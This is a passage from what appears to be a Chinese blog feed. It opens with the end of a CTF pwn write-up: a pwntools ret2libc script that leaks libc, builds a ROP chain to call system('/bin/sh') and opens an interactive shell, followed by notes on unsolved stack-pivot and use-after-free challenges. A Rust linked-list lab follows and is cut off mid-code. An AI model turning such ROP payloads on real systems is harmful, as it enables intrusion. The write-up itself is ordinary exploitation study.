punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>age <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>age_hex<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>system <span class="token operator">=</span>  age <span class="token operator">+</span> <span class="token number">0x64750</span> <span class="token operator">-</span> <span class="token number">0x9eef3</span>libc_base <span class="token operator">=</span> system <span class="token operator">-</span> system_offsetpop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> pop_rdi_ret_offset<span class="token comment"># 第五步，跳过</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many dishes would u like to eat?"</span><span class="token punctuation">)</span><span class="token comment">#p.send(b'a')</span>payload3 <span class="token operator">=</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">88</span>   <span class="token comment"># 填满 buf[11]</span>payload3 <span class="token operator">+=</span> <span class="token string">b'D'</span> <span class="token operator">*</span> <span class="token number">8</span>   <span class="token comment"># 填充</span><span class="token comment">#payload3 += b'E' * 8    # 填充rbp</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Okey, then What would you like to eat?"</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(p)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"pop_rdi"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>简洁至极的程序，除了libc和16字节的栈溢出真就什么都没有。如果给个pop rdi ret的gadget就可以很舒适地调用puts泄露libc基地址，栈迁移重新ROP，然而啥也没有。</p><p>尝试迁移后直接puts泄露got表，但是没有成功，疑似是<code>RELRO: Full RELRO</code>干的好事</p><p>尝试学习ret2dl-resolve，并没有掌握于是未果</p><h2 id="uniform"><a href="#uniform" class="headerlink" title="uniform"></a>uniform</h2><p>能看得出是UAF漏洞，但是涉及堆，还没学过，本来想pivot解完去学的，结果卡死了，不会</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;ret&quot;&gt;&lt;a href=&quot;#ret&quot; class=&quot;headerlink&quot; title=&quot;ret&quot;&gt;&lt;/a&gt;ret&lt;/h2&gt;&lt;p&gt;签到题，明摆着的栈溢出和后门函数，略&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot;</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数据结构_链表实验</title>
    <link href="https://aucept.in/2025/09/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/09/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-09-28T09:50:00.000Z</published>
    <updated>2025-10-18T05:50:50.172Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇是根据rust语言圣经的指导写的迭代器版本，这次我想用一种更贴近过程式的风格</p><h2 id="实验一：城市链表"><a href="#实验一：城市链表" class="headerlink" title="实验一：城市链表"></a>实验一：城市链表</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">城市链表:    将若干城市的信息，存入一个带头结点的链表中。结点中的城市信息包括:城市名和标进行有关查找、插入、删除、更新等操作。城市的位置坐标。要求能够利用城市名和位置基本要求:    ①给定一个城市名，返回其位置坐标:    ②给定一个位置坐标P和一个距离 D，返回所有与 P的距离小于等于 D 的城市。测试数据:    依据软件工程的测试技术自己确定，注意则试边界数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先是定义单链表的结构，不需要实现泛型：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span><span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Head</span><span class="token punctuation">&#123;</span>    first <span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[derive(Clone)]</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>    city_name <span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>    p_x <span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    p_y <span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    next <span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>由于不能保证字符串可以在编译期确定，所以这里不能用&amp;str，虽说实验没做要求</p><p>先写几个简单的：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> new_list<span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>first<span class="token punctuation">:</span> <span class="token class-name">None</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        new_list    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> x <span class="token punctuation">:</span>c_double<span class="token punctuation">,</span> y<span class="token punctuation">:</span>c_double<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        new_node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> x<span class="token punctuation">:</span>c_double<span class="token punctuation">,</span> y<span class="token punctuation">:</span>c_double<span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>city_name <span class="token punctuation">:</span> name<span class="token punctuation">,</span> p_x<span class="token punctuation">:</span> x<span class="token punctuation">,</span> p_y<span class="token punctuation">:</span> y<span class="token punctuation">,</span> next <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        new_node    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token class-name">Head</span><span class="token punctuation">;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_insert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>take可以将option里的东西拿出来，移交所有权并替换为None，用在这里再合适不过。</p><p>接下来就要面临所有权的问题：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">find_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> name <span class="token operator">==</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x<span class="token punctuation">,</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>问题出在<code>current = node.borrow().next;</code>，current明明是一个Link的不可变引用，怎么能把Link直接给它</p><p>如果变成<code>current = &amp;node.borrow().next;</code>又有了新的问题，node马上就要离开作用域被释放了，current怎么还能持有其引用</p><p>那么问题来到了current的声明<code>let mut current = &amp;self.first;</code>，略作调整<code>let mut current = self.first.clone();</code>这样current就不再是引用，而拷贝的实际是个指针，没有什么额外开销<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">find_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> name <span class="token operator">==</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x<span class="token punctuation">,</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_find_with_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"foobar"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>两次clone指针成功解决了所有权问题，测试也是顺利通过</p><p>接下来根据距离筛城市，如法炮制：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">find_with_distance</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span>position<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> distance<span class="token punctuation">:</span><span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> names <span class="token operator">=</span> <span class="token class-name">HashMap</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">calculate_distance</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x<span class="token punctuation">,</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> distance<span class="token punctuation">&#123;</span>            names<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    names<span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">calculate_distance</span><span class="token punctuation">(</span>center <span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> city_position<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">f64</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span> <span class="token operator">=</span> center<span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> city_position<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>x2 <span class="token operator">-</span> x1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y2 <span class="token operator">-</span> y1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_find_with_distance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> test1 <span class="token operator">=</span> head<span class="token punctuation">.</span><span class="token function">find_with_distance</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_distance</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来是删除，事情没有那么简单，需要根据下一项的值确定具体操作，先写一下第一版：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">remove_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> 